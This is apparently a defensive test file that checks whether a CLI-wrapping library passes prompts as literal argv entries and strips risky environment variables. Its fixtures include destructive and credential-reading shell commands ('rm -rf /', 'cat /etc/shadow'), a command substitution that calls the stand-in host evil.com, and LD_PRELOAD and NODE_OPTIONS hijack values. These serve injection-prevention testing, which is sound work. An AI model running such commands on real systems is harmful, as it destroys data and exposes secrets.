import { describe, it, expect } from "vitest";
import {
  buildCliArgs,
  buildPrompt,
  buildSanitizedEnv,
} from "../../src/transformers/request.js";

describe("command injection prevention", () => {
  const defaultCliOptions = {
    outputFormat: "json" as const,
    resolvedModel: "sonnet",
    sessionId: "test-session-id",
    sessionAction: "created" as const,
  };

  it("passes malicious prompt content as literal argv element", () => {
    const result = buildPrompt(
      [{ role: "user", content: "; rm -rf / && echo pwned" }],
      false,
    );
    // The prompt should contain the malicious string literally
    expect(result.prompt).toContain("; rm -rf / && echo pwned");

    // buildCliArgs returns an array — each element is a separate argv entry
    // With shell: false (enforced by CI), these are never interpreted by a shell
    const args = buildCliArgs({
      ...defaultCliOptions,
      prompt: result.prompt,
    });

    // Verify the prompt is passed as the last argument (after -p flag)
    const pIndex = args.indexOf("-p");
    expect(pIndex).toBeGreaterThan(-1);
    expect(args[pIndex + 1]).toContain("; rm -rf /");
  });

  it("handles backtick injection in prompts", () => {
    const result = buildPrompt(
      [{ role: "user", content: "`cat /etc/passwd`" }],
      false,
    );
    expect(result.prompt).toContain("`cat /etc/passwd`");
  });

  it("handles $() command substitution in prompts", () => {
    const result = buildPrompt([{ role: "user", content: "$(whoami)" }], false);
    expect(result.prompt).toContain("$(whoami)");
  });

  it("handles pipe injection in prompts", () => {
    const result = buildPrompt(
      [{ role: "user", content: "hello | cat /etc/shadow" }],
      false,
    );
    expect(result.prompt).toBe("hello | cat /etc/shadow");

    const args = buildCliArgs({
      ...defaultCliOptions,
      prompt: result.prompt,
    });
    const pIndex = args.indexOf("-p");
    expect(args[pIndex + 1]).toBe("hello | cat /etc/shadow");
  });

  it("handles newline injection in model name", () => {
    // buildCliArgs should pass model as a single argv element
    const args = buildCliArgs({
      ...defaultCliOptions,
      prompt: "hello",
      resolvedModel: "sonnet\n--dangerous-flag",
    });
    const modelIndex = args.indexOf("--model");
    expect(modelIndex).toBeGreaterThan(-1);
    // The model value should be a single string containing the newline
    expect(args[modelIndex + 1]).toBe("sonnet\n--dangerous-flag");
  });

  it("handles shell metacharacters in system prompt", () => {
    const result = buildPrompt(
      [
        { role: "system", content: "$(curl http://evil.com)" },
        { role: "user", content: "hello" },
      ],
      false,
    );
    expect(result.systemPrompt).toBe("$(curl http://evil.com)");

    const args = buildCliArgs({
      ...defaultCliOptions,
      prompt: result.prompt,
      systemPrompt: result.systemPrompt,
    });
    const sysIndex = args.indexOf("--system-prompt");
    expect(sysIndex).toBeGreaterThan(-1);
    expect(args[sysIndex + 1]).toBe("$(curl http://evil.com)");
  });

  it("handles argument injection via -- in prompt", () => {
    const result = buildPrompt(
      [{ role: "user", content: "-- --output-format text" }],
      false,
    );
    expect(result.prompt).toBe("-- --output-format text");

    const args = buildCliArgs({
      ...defaultCliOptions,
      prompt: result.prompt,
    });
    // The malicious string should be passed as a value to -p, not as separate args
    const pIndex = args.indexOf("-p");
    expect(args[pIndex + 1]).toBe("-- --output-format text");
  });

  it("handles null bytes in prompt content", () => {
    const result = buildPrompt(
      [{ role: "user", content: "hello\x00world" }],
      false,
    );
    expect(result.prompt).toBe("hello\x00world");
  });

  it("preserves multi-turn malicious content as labeled format", () => {
    const result = buildPrompt(
      [
        { role: "user", content: "; drop table users;" },
        { role: "assistant", content: "I cannot do that." },
        { role: "user", content: "$(rm -rf /)" },
      ],
      false,
    );
    expect(result.prompt).toContain("User: ; drop table users;");
    expect(result.prompt).toContain("User: $(rm -rf /)");
  });
});

describe("environment sanitization prevents injection", () => {
  it("strips dangerous environment variables", () => {
    const env = buildSanitizedEnv({
      PATH: "/usr/bin",
      HOME: "/home/user",
      LD_PRELOAD: "/tmp/evil.so",
      LD_LIBRARY_PATH: "/tmp/evil",
      NODE_OPTIONS: "--require /tmp/evil.js",
      PYTHONPATH: "/tmp/evil",
      BASH_ENV: "/tmp/evil.sh",
      ENV: "/tmp/evil.sh",
    });

    expect(env.LD_PRELOAD).toBeUndefined();
    expect(env.LD_LIBRARY_PATH).toBeUndefined();
    expect(env.NODE_OPTIONS).toBeUndefined();
    expect(env.PYTHONPATH).toBeUndefined();
    expect(env.BASH_ENV).toBeUndefined();
    expect(env.ENV).toBeUndefined();
  });

  it("only passes allowlisted keys", () => {
    const env = buildSanitizedEnv({
      PATH: "/usr/bin",
      HOME: "/home/user",
      LANG: "en_US.UTF-8",
      ANTHROPIC_API_KEY: "sk-ant-123",
      MALICIOUS_VAR: "evil-value",
    });

    const keys = Object.keys(env);
    // Should only contain TERM + allowlisted keys
    for (const key of keys) {
      expect(["PATH", "HOME", "LANG", "ANTHROPIC_API_KEY", "TERM"]).toContain(
        key,
      );
    }
  });
});
